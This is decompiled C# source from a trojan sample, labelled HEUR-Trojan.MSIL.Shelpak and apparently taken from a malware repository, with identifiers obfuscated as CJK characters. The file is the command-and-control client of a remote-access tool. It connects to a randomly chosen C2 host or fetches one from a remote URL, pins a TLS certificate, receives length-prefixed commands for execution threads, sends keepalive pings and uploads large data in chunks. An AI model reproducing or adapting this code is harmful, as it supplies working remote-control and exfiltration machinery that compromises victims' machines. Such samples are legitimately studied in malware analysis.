// Decompiled with JetBrains decompiler
// Type: 月月刀己毛皮丿黹皮老.十夂貝襾糸卩亠月厶犬爿力金日
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using 爿丨黑干匕矢止非巾牙辵;
using 片水冫臼隶夕厂乙几犬二色里;
using 目巾金皿宀肉戈勹寸月匕舟亠;
using 黃气骨黃工辵角爻匸斤匚欠虫;

namespace 月月刀己毛皮丿黹皮老
{
  public static class 十夂貝襾糸卩亠月厶犬爿力金日
  {
    public static Socket 卩气目屮鼠无力隶屮士辰戶 { get; set; }

    public static SslStream 靑聿爪曰入几鼓气二首曰虍冖 { get; set; }

    private static byte[] 金虫广夊女歹木貝魚麻人禾鼻方 { get; set; }

    private static long 人鬯冫魚刀山支甘尢鬥木爿羽矛文 { get; set; }

    private static long 勹魚宀几爪八匕金人网戈殳皿酉毛臣片 { get; set; }

    private static System.Threading.Timer 爪夊广厂入匚豆麥夂爿血方卩卩黍釆 { get; set; }

    public static bool 穴凵馬几尢彡香力片黃木辛廴入 { get; set; }

    private static object 巾二止巛殳人戈宀黑斤网日 { get; } = new object();

    private static System.Threading.Timer 比毋士入身走殳馬牙鬼矢 { get; set; }

    public static int 殳几斗心玄工穴士亠小舛釆厂黃 { get; set; }

    public static bool 月入鹵干爿麥匸干彳高父 { get; set; }

    public static void 飛酉斤香厶月厂毋夂匕子耒方几赤()
    {
      try
      {
        十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
        {
          ReceiveBufferSize = 51200,
          SendBufferSize = 51200
        };
        if (非隶攴羊冂長口文立厂.頁雨皮支羽冂厶屮屮毋隶尸卜矢爻比 == "null")
        {
          string str = 非隶攴羊冂長口文立厂.月牙白襾曰車鬲皿夊辰鼠弋.Split(',')[new Random().Next(非隶攴羊冂長口文立厂.月牙白襾曰車鬲皿夊辰鼠弋.Split(',').Length)];
          int int32 = Convert.ToInt32(非隶攴羊冂長口文立厂.一十耳十矛廾爻文几冂癶片斤.Split(',')[new Random().Next(非隶攴羊冂長口文立厂.一十耳十矛廾爻文几冂癶片斤.Split(',').Length)]);
          if (十夂貝襾糸卩亠月厶犬爿力金日.巛尢戶弓几木二夕女爿己(str))
          {
            foreach (IPAddress hostAddress in Dns.GetHostAddresses(str))
            {
              try
              {
                十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Connect(hostAddress, int32);
                if (十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Connected)
                  break;
              }
              catch
              {
              }
            }
          }
          else
            十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Connect(str, int32);
        }
        else
        {
          using (WebClient webClient = new WebClient())
          {
            NetworkCredential networkCredential = new NetworkCredential("", "");
            webClient.Credentials = (ICredentials) networkCredential;
            string[] strArray = webClient.DownloadString(非隶攴羊冂長口文立厂.頁雨皮支羽冂厶屮屮毋隶尸卜矢爻比).Split(new string[1]
            {
              ":"
            }, StringSplitOptions.None);
            非隶攴羊冂長口文立厂.月牙白襾曰車鬲皿夊辰鼠弋 = strArray[0];
            非隶攴羊冂長口文立厂.一十耳十矛廾爻文几冂癶片斤 = strArray[new Random().Next(1, strArray.Length)];
            十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Connect(非隶攴羊冂長口文立厂.月牙白襾曰車鬲皿夊辰鼠弋, Convert.ToInt32(非隶攴羊冂長口文立厂.一十耳十矛廾爻文几冂癶片斤));
          }
        }
        if (十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Connected)
        {
          十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = true;
          十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖 = new SslStream((Stream) new NetworkStream(十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶, true), false, new RemoteCertificateValidationCallback(十夂貝襾糸卩亠月厶犬爿力金日.雨手車爿口匚田斗比水));
          十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.AuthenticateAsClient(十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.RemoteEndPoint.ToString().Split(':')[0], (X509CertificateCollection) null, SslProtocols.Tls, false);
          十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 = 4L;
          十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方 = new byte[十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文];
          十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片 = 0L;
          十夂貝襾糸卩亠月厶犬爿力金日.尢片冖卩氏禸山支羽父色囗鼓頁(玉老勹長干齊冂工辰衣火女.无厂二己鼎月水斗匸缶力用());
          十夂貝襾糸卩亠月厶犬爿力金日.殳几斗心玄工穴士亠小舛釆厂黃 = 0;
          十夂貝襾糸卩亠月厶犬爿力金日.月入鹵干爿麥匸干彳高父 = false;
          十夂貝襾糸卩亠月厶犬爿力金日.爪夊广厂入匚豆麥夂爿血方卩卩黍釆 = new System.Threading.Timer(new TimerCallback(十夂貝襾糸卩亠月厶犬爿力金日.玉工丶龍艮缶廾又支丿夂), (object) null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
          十夂貝襾糸卩亠月厶犬爿力金日.比毋士入身走殳馬牙鬼矢 = new System.Threading.Timer(new TimerCallback(十夂貝襾糸卩亠月厶犬爿力金日.戈冫釆里毋土方毋爿火戈甘), (object) null, 1, 1);
          十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.BeginRead(十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方, (int) 十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片, (int) 十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文, new AsyncCallback(十夂貝襾糸卩亠月厶犬爿力金日.豸甘卜矛十比口鬼卜缶頁白頁爻), (object) null);
        }
        else
          十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
      }
      catch
      {
        十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
      }
    }

    private static bool 巛尢戶弓几木二夕女爿己(string 儿心子疒厶鬥无面阜匚鬥) => Uri.CheckHostName(儿心子疒厶鬥无面阜匚鬥) != 0;

    private static bool 雨手車爿口匚田斗比水(
      object 八彡老非斗冖邑干釆囗黃羽支尸,
      X509Certificate 艮風血酉鹿人亅片虍尸黽凵匸,
      X509Chain 二火入隶土爪大小龠力,
      SslPolicyErrors 耳亠口欠厂厶火厶鳥邑气廾黃)
    {
      return 非隶攴羊冂長口文立厂.骨日匕斗而月毋韭攴至音夕小赤广几彐.Equals(艮風血酉鹿人亅片虍尸黽凵匸);
    }

    public static void 厶木夂角臣弓无厂一禸巛穴舟厶丨()
    {
      try
      {
        十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖?.Dispose();
        十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶?.Dispose();
        十夂貝襾糸卩亠月厶犬爿力金日.比毋士入身走殳馬牙鬼矢?.Dispose();
        十夂貝襾糸卩亠月厶犬爿力金日.爪夊广厂入匚豆麥夂爿血方卩卩黍釆?.Dispose();
      }
      catch
      {
      }
      十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
    }

    public static void 豸甘卜矛十比口鬼卜缶頁白頁爻(IAsyncResult 爻聿鬥夊鼎戈靑匕匸弓殳)
    {
      try
      {
        if (!十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Connected || !十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入)
        {
          十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
        }
        else
        {
          int num1 = 十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.EndRead(爻聿鬥夊鼎戈靑匕匸弓殳);
          if (num1 > 0)
          {
            十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片 += (long) num1;
            十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 -= (long) num1;
            if (十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 == 0L)
            {
              十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 = (long) BitConverter.ToInt32(十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方, 0);
              if (十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 > 0L)
              {
                十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片 = 0L;
                十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方 = new byte[十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文];
                while (十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 > 0L)
                {
                  int num2 = 十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.Read(十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方, (int) 十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片, (int) 十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文);
                  if (num2 <= 0)
                  {
                    十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
                    return;
                  }
                  十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片 += (long) num2;
                  十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 -= (long) num2;
                  if (十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 < 0L)
                  {
                    十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
                    return;
                  }
                }
                new Thread(new ParameterizedThreadStart(目夂夂匚八十巾弋父匸巾羊.匸力爿欠長止身几日二虍戈)).Start((object) 十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方);
                十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片 = 0L;
                十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 = 4L;
                十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方 = new byte[十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文];
              }
              else
              {
                十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 = 4L;
                十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方 = new byte[十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文];
                十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片 = 0L;
              }
            }
            else if (十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文 < 0L)
            {
              十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
              return;
            }
            十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.BeginRead(十夂貝襾糸卩亠月厶犬爿力金日.金虫广夊女歹木貝魚麻人禾鼻方, (int) 十夂貝襾糸卩亠月厶犬爿力金日.勹魚宀几爪八匕金人网戈殳皿酉毛臣片, (int) 十夂貝襾糸卩亠月厶犬爿力金日.人鬯冫魚刀山支甘尢鬥木爿羽矛文, new AsyncCallback(十夂貝襾糸卩亠月厶犬爿力金日.豸甘卜矛十比口鬼卜缶頁白頁爻), (object) null);
          }
          else
            十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
        }
      }
      catch
      {
        十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
      }
    }

    public static void 尢片冖卩氏禸山支羽父色囗鼓頁(byte[] 一方八雨爻馬長長魚亅匚曰巾龜子)
    {
      lock (十夂貝襾糸卩亠月厶犬爿力金日.巾二止巛殳人戈宀黑斤网日)
      {
        try
        {
          if (!十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入)
            return;
          byte[] bytes = BitConverter.GetBytes(一方八雨爻馬長長魚亅匚曰巾龜子.Length);
          十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Poll(-1, SelectMode.SelectWrite);
          十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.Write(bytes, 0, bytes.Length);
          if (一方八雨爻馬長長魚亅匚曰巾龜子.Length > 1000000)
          {
            using (MemoryStream memoryStream = new MemoryStream(一方八雨爻馬長長魚亅匚曰巾龜子))
            {
              memoryStream.Position = 0L;
              byte[] buffer = new byte[50000];
              int count;
              while ((count = memoryStream.Read(buffer, 0, buffer.Length)) > 0)
              {
                十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Poll(-1, SelectMode.SelectWrite);
                十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.Write(buffer, 0, count);
                十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.Flush();
              }
            }
          }
          else
          {
            十夂貝襾糸卩亠月厶犬爿力金日.卩气目屮鼠无力隶屮士辰戶.Poll(-1, SelectMode.SelectWrite);
            十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.Write(一方八雨爻馬長長魚亅匚曰巾龜子, 0, 一方八雨爻馬長長魚亅匚曰巾龜子.Length);
            十夂貝襾糸卩亠月厶犬爿力金日.靑聿爪曰入几鼓气二首曰虍冖.Flush();
          }
        }
        catch
        {
          十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入 = false;
        }
      }
    }

    public static void 玉工丶龍艮缶廾又支丿夂(object 小十攴虍麻尢宀匕彡耳面戶疒)
    {
      try
      {
        車目爻非方支戈牙曰歹鹿心大黃 車目爻非方支戈牙曰歹鹿心大黃 = new 車目爻非方支戈牙曰歹鹿心大黃();
        車目爻非方支戈牙曰歹鹿心大黃.舟黑比彳己匚戶弋火大冂夕尸("Packet").又谷角手匸耳丿艮二月网 = "Ping";
        車目爻非方支戈牙曰歹鹿心大黃.舟黑比彳己匚戶弋火大冂夕尸("Message").又谷角手匸耳丿艮二月网 = 火金女里勹毋舌鬯走犬瓦鹵木.又日里戈風斤戶豕欠白黑酉();
        十夂貝襾糸卩亠月厶犬爿力金日.尢片冖卩氏禸山支羽父色囗鼓頁(車目爻非方支戈牙曰歹鹿心大黃.匸小骨臣虍入彡鼠毛缶厶卜弋());
        GC.Collect();
        十夂貝襾糸卩亠月厶犬爿力金日.月入鹵干爿麥匸干彳高父 = true;
      }
      catch
      {
      }
    }

    private static void 戈冫釆里毋土方毋爿火戈甘(object 白頁月辛歹瓜毋金冂人子士鹿衣長凵)
    {
      try
      {
        if (!十夂貝襾糸卩亠月厶犬爿力金日.月入鹵干爿麥匸干彳高父 || !十夂貝襾糸卩亠月厶犬爿力金日.穴凵馬几尢彡香力片黃木辛廴入)
          return;
        ++十夂貝襾糸卩亠月厶犬爿力金日.殳几斗心玄工穴士亠小舛釆厂黃;
      }
      catch
      {
      }
    }
  }
}
